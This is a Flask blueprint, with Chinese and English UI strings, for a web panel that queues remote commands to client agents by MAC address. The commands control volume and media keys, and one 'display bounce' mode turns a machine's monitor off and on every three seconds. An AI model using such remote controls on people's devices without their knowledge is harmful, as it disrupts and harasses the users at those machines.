from flask import Blueprint, render_template_string, session, redirect, url_for, request, jsonify
from core import clients_db, save_db, encrypt_data, decrypt_data, add_cmd_to_queue, init_client_queue
try:
    from ui import ADMIN_CSS
except Exception:
    ADMIN_CSS = ""

bp = Blueprint('entertainment', __name__)

def _replace_pending_media_bounce(mac, cmd):
    init_client_queue(mac)
    queue = clients_db[mac].get('cmd_queue', [])
    clients_db[mac]['cmd_queue'] = [
        item for item in queue
        if not str(item.get('cmd', '')).startswith('F_CMD:MEDIA_BOUNCE:')
    ]
    return add_cmd_to_queue(mac, cmd, priority='low')

@bp.route('/api/media_info_result', methods=['POST'])
def media_info_result():
    mac_raw = request.form.get('mac')
    info_raw = request.form.get('info')

    if mac_raw and info_raw:
        mac = decrypt_data(mac_raw)
        info = decrypt_data(info_raw)
        if mac in clients_db:
            # Parse VOL:xx|SONG:xxxx
            vol = 0
            song = '未知'
            for part in info.split('|'):
                if part.startswith('VOL:'):
                    try: vol = int(part[4:])
                    except: pass
                elif part.startswith('SONG:'):
                    song = part[5:]

            clients_db[mac]['media_vol'] = vol
            clients_db[mac]['media_song'] = song
            save_db()
    return "ok", 200

@bp.route('/api/get_entertainment_info/<mac>', methods=['GET'])
def get_entertainment_info(mac):
    if not session.get('logged_in'):
        return jsonify({"status": "error", "msg": "No auth"}), 403
    if mac not in clients_db:
        return jsonify({"status": "error"}), 404

    return jsonify({
        "status": "ok",
        "vol": clients_db[mac].get('media_vol', 50),
        "song": clients_db[mac].get('media_song', '等待同步中...'),
        "bounce": clients_db[mac].get('media_bounce_enabled', False)
    })

@bp.route('/api/media_bounce/<mac>', methods=['POST'])
def set_media_bounce(mac):
    if not session.get('logged_in'):
        return jsonify({"status": "error", "msg": "No auth"}), 403
    if mac not in clients_db:
        return jsonify({"status": "error", "msg": "Device not found"}), 404

    data = request.json or {}
    enabled = bool(data.get('enabled', False))
    clients_db[mac]['media_bounce_enabled'] = enabled
    _replace_pending_media_bounce(mac, f"F_CMD:MEDIA_BOUNCE:{1 if enabled else 0}")
    save_db()
    return jsonify({"status": "ok", "enabled": enabled})

@bp.route('/entertainment/<mac>')
def entertainment_page(mac):
    if not session.get('logged_in'):
        return redirect(url_for('auth.login'))

    if mac not in clients_db:
        return "设备不存在", 404

    info = clients_db[mac]

    HTML = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
        <title>娱乐控制 - {{ info.name }}</title>
        <style>
            {{ admin_css|safe }}
            body { background:var(--bg); margin:0; padding:0; }
            .container { max-width:860px; }
            .media-grid { display:grid; grid-template-columns:repeat(2,minmax(0,1fr)); gap:12px; }
            .btn { margin:4px; }
            .btn-info.active { background:#ef4444; animation:pulse .5s infinite; }
            @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
            .header-link { display:inline-block; margin-bottom:12px; }
            .section { border:1px solid var(--line); border-radius:8px; padding:14px; background:#fff; }
            .section h3 { margin-bottom:6px; }
            .section p { color:var(--muted); font-size:13px; margin:0 0 12px; }
            .status-text { color:var(--green); font-size:13px; margin-top:12px; display:none; font-weight:700; }
            .media-now-playing { background:#f8fafc; border:1px solid var(--line); padding:16px; border-radius:8px; margin-bottom:12px; text-align:center; }
            .media-title { font-size:20px; font-weight:700; color:var(--text); margin-top:6px; word-break:break-word; }
            .volume-slider-container { display:flex; align-items:center; gap:10px; margin:12px 0; }
            input[type=range] { flex:1; min-width:120px; accent-color:var(--blue); }
            .vol-value { font-weight:700; min-width:32px; }
            @media(max-width:720px){ .media-grid{grid-template-columns:1fr}.container{margin:0}.section .btn{width:100%;margin:4px 0}.volume-slider-container{flex-wrap:wrap} }
        </style>
    </head>
    <body>
        <main class="shell">
        <div class="container">
            <div class="header">
                <div><h2>Media Control</h2><div class="subtle">{{ info.name }} [{{ mac }}]</div></div>
                <a class="btn muted" href="/">Back</a>
            </div>

            <div class="media-now-playing">
                <div class="subtle">Now playing</div>
                <div class="media-title" id="song-title">Syncing...</div>
            </div>

            <div class="media-grid">
            <div class="section">
                <h3>Volume</h3>
                <p>Adjust or mute the current system volume.</p>
                <div class="volume-slider-container">
                    <span>Volume</span>
                    <input type="range" id="vol-slider" min="0" max="100" value="50" onchange="setVolume(this.value)" oninput="document.getElementById('vol-display').innerText=this.value">
                    <span class="vol-value" id="vol-display">50</span>%
                </div>
                <button class="btn btn-danger" onclick="sendVolumeCmd('mute')">Toggle mute</button>
                <button class="btn btn-info" id="bounce-btn" onclick="toggleBounceMode()">Volume bounce</button>
            </div>

            <div class="section">
                <h3>Media Playback</h3>
                <p>Control common system media keys.</p>
                <button class="btn" onclick="sendMediaCmd('playpause')">Play / Pause</button>
                <button class="btn" onclick="sendMediaCmd('prev')">Previous</button>
                <button class="btn" onclick="sendMediaCmd('next')">Next</button>
            </div>

            <div class="section">
                <h3>Short Video</h3>
                <p>Send common keyboard navigation keys to the active app.</p>
                <button class="btn" onclick="sendShortVideoCmd('playpause')">Pause / Resume</button>
                <button class="btn" onclick="sendShortVideoCmd('next')">Next item</button>
                <button class="btn" onclick="sendShortVideoCmd('prev')">Previous item</button>
            </div>

            <div class="section">
                <h3>Display Power</h3>
                <p>Turn the display off or wake it remotely.</p>
                <button class="btn btn-warning" onclick="sendCustomCmd('F_CMD:MONITOR_OFF:')">Display off</button>
                <button class="btn btn-success" onclick="sendCustomCmd('F_CMD:MONITOR_ON:')">Wake display</button>
                <button class="btn btn-info" id="monitor-bounce-btn" onclick="toggleMonitorBounceMode()">Display bounce</button>
            </div>
            </div>

            <div id="status-msg" class="status-text">Command sent.</div>
            <div id="status-error" class="status-text" style="color:red;display:none;">Command failed.</div>

            <script>
                let bounceMode = false;
                let monitorBounceMode = false;
                let monitorBounceInterval = null;

                function showStatus(message = '指令已下发！', isError = false) {
                    if (isError) {
                        const msg = document.getElementById('status-error');
                        msg.innerText = message;
                        msg.style.display = 'block';
                        setTimeout(() => msg.style.display = 'none', 3000);
                    } else {
                        const msg = document.getElementById('status-msg');
                        msg.innerText = message;
                        msg.style.display = 'block';
                        setTimeout(() => msg.style.display = 'none', 1500);
                    }
                }

                function sendCmd(cmdStr) {
                    fetch('/api/send_cmd', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({mac: '{{ mac }}', cmd: cmdStr})
                    }).then(res => res.json()).then(data => {
                        if (data.status === 'ok') {
                            showStatus(data.msg || '指令已下发！', false);
                        } else if (res.status === 429) {
                            showStatus('服务器繁忙，请稍后再试！', true);
                        } else {
                            showStatus('投递失败: ' + (data.msg || '未知错误'), true);
                        }
                    }).catch(err => {
                        console.error("发送失败: ", err);
                        showStatus('网络错误，请检查连接！', true);
                    });
                }

                function sendCustomCmd(cmdStr) {
                    sendCmd(cmdStr);
                }

                function setVolume(val) {
                    sendCmd("F_CMD:MEDIA_VOL_SET:" + val);
                }

                function sendVolumeCmd(action) {
                    let code = 173; // Mute
                    if (action === 'up') code = 175; // Volume Up
                    if (action === 'down') code = 174; // Volume Down
                    sendCmd("F_CMD:MEDIA:" + code);
                }

                function sendMediaCmd(action) {
                    let code = 179; // Play/Pause
                    if (action === 'next') code = 176; // Next Track
                    if (action === 'prev') code = 177; // Previous Track
                    sendCmd("F_CMD:MEDIA:" + code);
                }

                function sendShortVideoCmd(action) {
                    let code = 32; // Space: Pause/Resume
                    if (action === 'next') code = 40; // Arrow Down: Next video
                    if (action === 'prev') code = 38; // Arrow Up: Previous video
                    sendCmd("F_CMD:MEDIA:" + code);
                }

                function toggleBounceMode() {
                    setBounceMode(!bounceMode);
                }

                function setBounceButton(enabled) {
                    const btn = document.getElementById('bounce-btn');
                    bounceMode = enabled;
                    if (enabled) {
                        btn.classList.add('active');
                        btn.innerText = 'Volume bounce (running)';
                    } else {
                        btn.classList.remove('active');
                        btn.innerText = 'Volume bounce';
                    }
                }

                function setBounceMode(enabled) {
                    fetch('/api/media_bounce/{{ mac }}', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({enabled})
                    }).then(r => r.json()).then(data => {
                        if (data.status === 'ok') {
                            setBounceButton(data.enabled);
                            showStatus(data.enabled ? 'Volume bounce enabled.' : 'Volume bounce disabled.');
                        } else {
                            showStatus('Failed to update bounce state.', true);
                        }
                    }).catch(() => showStatus('Network error.', true));
                }

                function toggleMonitorBounceMode() {
                    monitorBounceMode = !monitorBounceMode;
                    const btn = document.getElementById('monitor-bounce-btn');

                    if (monitorBounceMode) {
                        btn.classList.add('active');
                        btn.innerText = '🎆 显示器蹦迪（运行中...）';

                        // Alternate between turning monitor on and off every 3 seconds
                        let isMonitorOn = true;
                        monitorBounceInterval = setInterval(() => {
                            if (isMonitorOn) {
                                sendCustomCmd('F_CMD:MONITOR_OFF:');
                                isMonitorOn = false;
                            } else {
                                sendCustomCmd('F_CMD:MONITOR_ON:');
                                isMonitorOn = true;
                            }
                        }, 3000);

                        // Send first command immediately (turn off)
                        sendCustomCmd('F_CMD:MONITOR_OFF:');
                    } else {
                        btn.classList.remove('active');
                        btn.innerText = '🎆 显示器蹦迪';
                        clearInterval(monitorBounceInterval);
                        monitorBounceInterval = null;
                        // Make sure monitor is back on when exiting
                        sendCustomCmd('F_CMD:MONITOR_ON:');
                    }
                }

                // Periodic UI refresh & Trigger Agent Info command
                function pollInfo() {
                    // Tell agent to report media info
                    fetch('/api/send_cmd', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({mac: '{{ mac }}', cmd: 'F_CMD:MEDIA_INFO:'})
                    });

                    // Fetch what agent reported back to our server
                    setTimeout(() => {
                        fetch('/api/get_entertainment_info/{{ mac }}')
                        .then(r => r.json())
                        .then(d => {
                            if(d.status === 'ok') {
                                document.getElementById('song-title').innerText = d.song;
                                setBounceButton(!!d.bounce);
                                // Only update slider if user isn't currently dragging it and not in bounce mode
                                if (document.activeElement !== document.getElementById('vol-slider') && !bounceMode) {
                                    document.getElementById('vol-slider').value = d.vol;
                                    document.getElementById('vol-display').innerText = d.vol;
                                }
                            }
                        });
                    }, 1500);
                }

                // trigger loop
                setInterval(pollInfo, 10000);
                pollInfo();
            </script>
        </div>
        </main>
    </body>
    </html>
    """
    return render_template_string(HTML, admin_css=ADMIN_CSS, mac=mac, info=info)
